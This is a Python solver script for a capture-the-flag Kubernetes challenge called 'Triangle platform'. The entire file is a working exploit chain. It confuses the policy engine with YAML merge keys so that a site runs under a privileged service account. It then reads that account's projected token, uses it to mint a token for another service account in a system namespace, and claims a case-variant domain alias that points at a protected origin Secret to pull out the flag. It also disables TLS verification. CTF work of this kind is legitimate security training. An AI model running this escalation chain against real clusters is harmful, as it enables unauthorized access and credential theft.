#!/usr/bin/env python3
"""Recover the Triangle platform flag without submitting it."""

from __future__ import annotations

import base64
import json
import os
import re
import secrets
import ssl
import time
from pathlib import Path
from typing import Any, Callable
from urllib.error import HTTPError, URLError
from urllib.parse import quote
from urllib.request import Request, urlopen


DEFAULT_URL = "https://triangle-platform-1799fdf51e04.chall.nnsc.tf"
BASE_URL = os.environ.get("TRIANGLE_URL", DEFAULT_URL).rstrip("/")
ROOT = Path(__file__).resolve().parents[1]
SITE_NAMESPACE = "tenant-a"
ORIGIN_NAMESPACE = "triangle-system"
# Domain hosts are not constrained to DNS lowercase by the CRD.  The solver
# selects a free case variant before creating the alias; canonicalHost() maps
# that variant to the protected lowercase origin Secret.
ORIGIN_BASE_HOST = "acme-invoices.sites.triangle.tld"
FLAG_ORIGIN_HOST = "ACME-invoices.sites.triangle.tld"
TLS_CONTEXT = ssl._create_unverified_context()


class HTTPFailure(RuntimeError):
    def __init__(self, method: str, path: str, status: int, body: str):
        self.status = status
        self.body = body
        super().__init__(f"{method} {path} returned HTTP {status}: {body[:300]}")


def _path_segment(value: str) -> str:
    return quote(value, safe="")


def request(
    method: str,
    path: str,
    *,
    token: str | None = None,
    body: Any | None = None,
    content_type: str = "application/json",
) -> bytes:
    headers = {"Accept": "application/json"}
    data = None
    if body is not None:
        headers["Content-Type"] = content_type
        data = json.dumps(body, separators=(",", ":")).encode()
    if token is not None:
        headers["Authorization"] = f"Bearer {token}"

    req = Request(BASE_URL + path, data=data, headers=headers, method=method)
    try:
        with urlopen(req, context=TLS_CONTEXT, timeout=20) as response:
            return response.read()
    except HTTPError as exc:
        response_body = exc.read().decode("utf-8", "replace")
        raise HTTPFailure(method, path, exc.code, response_body) from exc
    except URLError as exc:
        raise RuntimeError(f"{method} {path} failed: {exc.reason}") from exc


def request_json(
    method: str,
    path: str,
    *,
    token: str | None = None,
    body: Any | None = None,
    content_type: str = "application/json",
) -> dict[str, Any]:
    return json.loads(request(method, path, token=token, body=body, content_type=content_type))


def request_text(method: str, path: str, *, token: str | None = None) -> str:
    return request(method, path, token=token).decode("utf-8", "replace")


def wait_for(description: str, check: Callable[[], Any], *, timeout: float = 120, interval: float = 2) -> Any:
    deadline = time.monotonic() + timeout
    last_error: Exception | None = None
    while time.monotonic() < deadline:
        try:
            result = check()
            if result:
                return result
        except (HTTPFailure, RuntimeError) as exc:
            last_error = exc
        time.sleep(interval)
    suffix = f" ({last_error})" if last_error else ""
    raise RuntimeError(f"timed out waiting for {description}{suffix}")


def edge_site_yaml() -> str:
    """Make Kyverno see forms while yaml.v3 makes the operator select tri-edge."""
    return "\n".join([
        "allowed: &allowed",
        "  integrations: [forms]",
        "integrations: [edge]",
        "<<: *allowed",
        "target: null",
        "server:",
        "  root: /var/run/triangle",
        "  index: token",
        "",
    ])


def origin_site_yaml() -> str:
    return "\n".join([
        "allowed: &allowed",
        "  integrations: [forms]",
        "integrations: [edge]",
        "<<: *allowed",
        "target: null",
        "server:",
        "  root: /var/run/origin",
        "  index: FLAG",
        "",
    ])


def site_path(name: str) -> str:
    return f"/apis/triangle.io/v1/namespaces/{SITE_NAMESPACE}/sites/{_path_segment(name)}"


def deployment_path(name: str) -> str:
    return f"/apis/apps/v1/namespaces/{SITE_NAMESPACE}/deployments/{_path_segment(name)}"


def service_file_path(name: str, filename: str) -> str:
    return f"/api/v1/namespaces/{SITE_NAMESPACE}/services/{_path_segment(name)}:80/proxy/{filename}"


def create_edge_site(name: str) -> None:
    request("POST", f"/apis/triangle.io/v1/namespaces/{SITE_NAMESPACE}/sites", body={
        "apiVersion": "triangle.io/v1",
        "kind": "Site",
        "metadata": {"name": name},
        "spec": {"siteYAML": edge_site_yaml()},
    })


def edge_deployment_ready(name: str) -> bool:
    deployment = request_json("GET", deployment_path(name))
    pod_spec = deployment.get("spec", {}).get("template", {}).get("spec", {})
    available = any(
        condition.get("type") == "Available" and condition.get("status") == "True"
        for condition in deployment.get("status", {}).get("conditions", [])
    )
    return pod_spec.get("serviceAccountName") == "tri-edge" and available


def projected_edge_token(name: str) -> str:
    token = request_text("GET", service_file_path(name, "token")).strip()
    if token.count(".") != 2:
        raise RuntimeError("site did not return a projected service-account token")
    return token


def create_registry_token_secret(name: str, edge_token: str) -> str:
    secret_name = f"{name}-registry-token"
    request("POST", f"/api/v1/namespaces/{ORIGIN_NAMESPACE}/secrets", token=edge_token, body={
        "apiVersion": "v1",
        "kind": "Secret",
        "metadata": {
            "name": secret_name,
            "annotations": {"kubernetes.io/service-account.name": "tri-registry-sync"},
        },
        "type": "kubernetes.io/service-account-token",
    })
    return secret_name


def registry_token(secret_name: str, edge_token: str) -> str:
    def read_token() -> str | None:
        secret = request_json(
            "GET",
            f"/api/v1/namespaces/{ORIGIN_NAMESPACE}/secrets/{_path_segment(secret_name)}",
            token=edge_token,
        )
        encoded = secret.get("data", {}).get("token")
        return base64.b64decode(encoded).decode("ascii") if encoded else None

    return wait_for("the registry service-account token", read_token)


def select_origin_host(registry_token_value: str) -> str:
    domains = request_json("GET", "/apis/triangle.io/v1/domains", token=registry_token_value)
    claimed = {
        item.get("spec", {}).get("host")
        for item in domains.get("items", [])
        if item.get("spec", {}).get("host")
    }
    for _ in range(64):
        chars = []
        upper_used = False
        for char in ORIGIN_BASE_HOST:
            if char.isalpha() and secrets.randbelow(2):
                chars.append(char.upper())
                upper_used = True
            else:
                chars.append(char)
        if not upper_used:
            chars[0] = chars[0].upper()
        candidate = "".join(chars)
        if candidate not in claimed:
            return candidate
    raise RuntimeError("could not find a free case variant for the origin host")


def create_origin_alias(
    site_name: str,
    registry_token_value: str,
    host: str = FLAG_ORIGIN_HOST,
) -> None:
    request("POST", "/apis/triangle.io/v1/domains", token=registry_token_value, body={
        "apiVersion": "triangle.io/v1",
        "kind": "Domain",
        "metadata": {"name": f"{site_name}-acme-origin"},
        "spec": {
            "host": host,
            "siteRef": {"namespace": SITE_NAMESPACE, "name": site_name},
        },
    })


def switch_to_origin(name: str) -> None:
    request(
        "PATCH",
        site_path(name),
        body={"spec": {"siteYAML": origin_site_yaml()}},
        content_type="application/merge-patch+json",
    )


def recover_flag(name: str) -> str:
    flag_pattern = re.compile(r"(?:NNS|FLAG)\{[^{}\r\n]+\}")

    def read_flag() -> str | None:
        body = request_text("GET", service_file_path(name, "FLAG"))
        match = flag_pattern.search(body)
        return match.group(0) if match else None

    return wait_for("the mounted origin flag", read_flag)


def solve() -> str:
    site_name = f"tri-escape-{secrets.token_hex(4)}"
    print(f"[*] creating {site_name}")
    create_edge_site(site_name)
    wait_for("the tri-edge deployment", lambda: edge_deployment_ready(site_name))

    edge_token = projected_edge_token(site_name)
    secret_name = create_registry_token_secret(site_name, edge_token)
    registry_token_value = registry_token(secret_name, edge_token)
    origin_host = select_origin_host(registry_token_value)
    print(f"[*] claiming origin alias {origin_host}")
    create_origin_alias(site_name, registry_token_value, origin_host)
    switch_to_origin(site_name)

    flag = recover_flag(site_name)
    (ROOT / "flag.txt").write_text(flag + "\n", encoding="utf-8")
    print(f"[+] flag: {flag}")
    print(f"[+] saved to {ROOT / 'flag.txt'}")
    return flag


if __name__ == "__main__":
    solve()
